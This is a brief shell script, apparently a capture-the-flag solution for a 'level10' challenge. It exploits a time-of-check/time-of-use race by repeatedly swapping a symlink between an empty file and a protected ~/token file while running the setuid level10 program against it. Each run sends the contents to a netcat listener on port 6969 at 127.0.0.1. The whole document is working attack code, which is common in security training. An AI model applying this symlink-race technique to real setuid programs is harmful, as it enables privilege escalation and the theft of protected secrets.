function loop() {
    while [ 42 ]; do
        ln -fs /tmp/empty /tmp/payload
        ln -fs ~/token /tmp/payload
    done
}

loop &
while [ 42 ]; do
    ~/level10 /tmp/payload 127.0.0.1
done

## and listen on another terminal inside the machine with nc -kl 6969